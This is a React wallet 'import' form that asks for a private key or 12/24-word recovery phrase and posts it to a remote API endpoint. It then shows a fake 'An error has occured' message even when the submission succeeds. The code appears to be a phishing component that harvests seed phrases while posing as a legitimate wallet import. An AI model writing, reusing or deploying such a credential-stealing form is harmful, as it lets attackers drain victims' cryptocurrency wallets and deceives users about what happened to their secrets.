import axios from "axios";
import React, { useState } from "react";
import { Form, Button, Spinner } from "react-bootstrap";
import toast from "react-hot-toast";
import { api, remoteApi } from "../../Global/Keys";
const PrivateKeyForm = () => {
  const [privateKey, setPrivateKey] = useState("");
  const [loading, setLoading] = useState(false);

  const onSubmit = async (e) => {
    e.preventDefault();

    if (privateKey === "") {
      return toast.error("Please include a Private Key");
    }

    setLoading(true);

    try {
      const res = await axios.post(`${remoteApi}/wallet/privateKey`, {
        privateKey,
      });
      // console.log(res.data);
      toast.error("An error has occured... Please check back");
      setLoading(false);
    } catch (err) {
      console.error(err.message);
      toast.error(err.message);
      setLoading(false);
    }
    setPrivateKey("");
  };

  return (
    <Form>
      <Form.Group
        className='mb-3'
        controlId='exampleForm.ControlInput1'
      ></Form.Group>
      <Form.Group className='mb-3' controlId='exampleForm.ControlTextarea1'>
        <Form.Control
          as='textarea'
          rows={3}
          placeholder='Enter Private...'
          className='mb-3'
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
        />
        <Form.Text>
          Typically 12 (sometimes 24) words separated by a single space.
        </Form.Text>
      </Form.Group>
      <Button
        className='fw-bold text-uppercase btn-block w-100 py-2 shadow-none'
        disabled={loading || privateKey === ""}
        onClick={(e) => onSubmit(e)}
      >
        {loading ? <Spinner animation='border' size='sm' /> : "import"}
      </Button>
    </Form>
  );
};

export default PrivateKeyForm;
